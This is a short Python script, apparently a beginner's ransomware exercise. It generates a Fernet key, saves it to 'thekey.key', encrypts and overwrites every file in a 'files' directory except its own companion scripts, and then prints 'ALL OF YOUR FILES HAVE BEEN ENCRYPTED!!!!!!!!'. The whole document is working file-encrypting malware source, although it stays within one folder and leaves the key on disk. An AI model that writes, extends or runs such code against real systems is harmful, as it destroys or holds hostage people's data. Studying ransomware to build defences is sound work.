#ATTENTION: do not run the encrpyt 2 times, because it will generate 2 keys and it will override the first one, on the file

import os
from cryptography.fernet import Fernet

files = []

currentDirectoryFiles = os.listdir("files")

#entering files directory and getting all the files from there
for file in currentDirectoryFiles:
    if file == 'malware.py' or file == 'thekey.key' or file == 'decrypt.py':
        continue
    #saving the directory from the files
    files.append("files/" + file)



#generating key
key = Fernet.generate_key()

#saving key to a file
#wb->write binary
with open('thekey.key', 'wb') as thekey: 
    thekey.write(key)

#for each file 
for file in files:
    with open(file, 'rb') as openFile:
        #read its contents and save it
        contents = openFile.read()
    # encrypt its contents
    contents_encrypted = Fernet(key).encrypt(contents)
    #read the file again and save its content as the encrypted data
    with open(file, 'wb') as openFileToWrite:
        openFileToWrite.write(contents_encrypted)


print('ALL OF YOUR FILES HAVE BEEN ENCRYPTED!!!!!!!!')